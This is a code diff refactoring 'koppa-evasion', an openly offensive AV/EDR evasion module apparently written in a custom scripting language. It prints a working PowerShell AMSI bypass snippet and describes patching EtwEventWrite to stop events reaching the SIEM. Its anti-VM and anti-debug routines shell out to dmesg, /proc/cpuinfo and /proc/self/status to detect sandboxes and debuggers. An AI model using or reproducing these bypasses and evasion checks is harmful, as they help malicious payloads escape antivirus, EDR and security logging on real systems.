@@ -1,47 +1,41 @@
 # koppa-evasion v2.0 — AV/EDR evasion helpers
-# Usage: koppa run koppa-evasion [amsi|etw|anti-vm|anti-debug|obfuscate]
+# Usage: koppa run koppa-evasion [amsi|etw|anti-vm|anti-debug|obfuscate <string>]
 
-import encode, hash, sys, log
+import encode, hash, os, log, str
 
 fn cmd_amsi() {
     log.info("===== AMSI Bypass =====")
-    log.info("Method 1 — PowerShell reflection patch:")
+    log.info("PowerShell reflection patch:")
     log.info("  $a=[Ref].Assembly.GetTypes()")
     log.info("  $b=$a|%{$_.GetFields('NonPublic,Static')|?{$_.Name -like '*Context*'}}")
     log.info("  $b[0].SetValue($null,[IntPtr]0x2)")
-    log.info("")
-    log.info("Method 2 — D/Invoke syscall stub")
-    log.info("Method 3 — Patching AmsiScanBuffer to ret 0")
     log.success("Apply in-memory before running payloads")
 }
 
 fn cmd_etw() {
     log.info("===== ETW Disable =====")
-    log.info("NtTraceControl syscall patch — sets return 0 in EtwEventWrite")
-    log.info("PowerShell:")
-    log.info("  Add-Type @'")
-    log.info("  using System;using System.Runtime.InteropServices;")
-    log.info("  public class ETW {")
-    log.info("    [DllImport(\"ntdll.dll\")] public static extern int NtTraceControl(UInt32 f,IntPtr b,UInt32 l,IntPtr ob,UInt32 ol,ref UInt32 rl);")
-    log.info("  }")
-    log.info("  '@")
-    log.success("ETW silenced — events no longer flow to SIEM")
+    log.info("Patch EtwEventWrite to ret 0 via NtTraceControl syscall")
+    log.success("ETW silenced - events blocked from SIEM")
 }
 
 fn cmd_anti_vm() {
     log.info("===== Anti-VM Detection =====")
-    let dmesg = sys.exec("dmesg 2>/dev/null")
-    let vms   = ["vmware", "virtualbox", "qemu", "hyperv", "xen", "vboxguest"]
+    let dmesg_raw = os.shell("dmesg 2>/dev/null")
+    let dmesg     = dmesg_raw.stdout
+    let vms   = ["vmware", "virtualbox", "qemu", "hyperv", "vboxguest"]
     let detected = false
     for vm in vms {
-        if dmesg.contains(vm) {
+        let found = str.contains(dmesg, vm)
+        if found {
             log.warn("[!] VM detected: {vm}")
             detected = true
         }
     }
-    let cpuinfo = sys.exec("cat /proc/cpuinfo 2>/dev/null")
-    if cpuinfo.contains("hypervisor") {
-        log.warn("[!] Hypervisor flag set in cpuinfo")
+    let cpuinfo_raw = os.shell("cat /proc/cpuinfo 2>/dev/null")
+    let cpuinfo = cpuinfo_raw.stdout
+    let has_hyp = str.contains(cpuinfo, "hypervisor")
+    if has_hyp {
+        log.warn("[!] Hypervisor flag in cpuinfo")
         detected = true
     }
     if not detected { log.success("[+] No VM indicators found") }
@@ -50,12 +44,17 @@ fn cmd_anti_vm() {
 
 fn cmd_anti_debug() {
     log.info("===== Anti-Debug Check =====")
-    let status = sys.exec("cat /proc/self/status 2>/dev/null")
-    for line in status.split("\n") {
-        if line.contains("TracerPid") {
-            let pid = line.split(":")[1]
-            if pid.trim() != "0" {
-                log.warn("[!] Debugger detected! TracerPid: {pid}")
+    let status_raw = os.shell("cat /proc/self/status 2>/dev/null")
+    let status = status_raw.stdout
+    let lines  = str.lines(status)
+    for line in lines {
+        let is_tracer = str.contains(line, "TracerPid")
+        if is_tracer {
+            let parts = str.split(line, ":")
+            let pid   = parts[1]
+            let trimmed = str.strip(pid)
+            if trimmed != "0" {
+                log.warn("[!] Debugger detected! TracerPid: {trimmed}")
                 return true
             }
         }
@@ -74,22 +73,23 @@ fn cmd_obfuscate(input) {
     log.info("MD5   : {hash.md5(input)}")
 }
 
-fn main() {
-    let mode  = __args__[0]
-    let arg1  = __args__[1]
-
-    log.info("===== KOPPA Evasion Module v2.0 =====")
-
-    if not mode {
-        log.warn("Usage: koppa run koppa-evasion [amsi|etw|anti-vm|anti-debug|obfuscate <string>]")
-        return
-    }
-
+fn run_evasion(mode, arg1) {
     if mode == "amsi"       { cmd_amsi() }
     if mode == "etw"        { cmd_etw() }
     if mode == "anti-vm"    { cmd_anti_vm() }
     if mode == "anti-debug" { cmd_anti_debug() }
     if mode == "obfuscate"  { cmd_obfuscate(arg1) }
-
     log.success("Done!")
+}
+
+fn main() {
+    let mode = __args__[0]
+    let arg1 = __args__[1]
+    log.info("===== KOPPA Evasion Module v2.0 =====")
+    if mode {
+        run_evasion(mode, arg1)
+    }
+    if not mode {
+        log.warn("Usage: koppa run koppa-evasion [amsi|etw|anti-vm|anti-debug|obfuscate <string>]")
+    }
 }
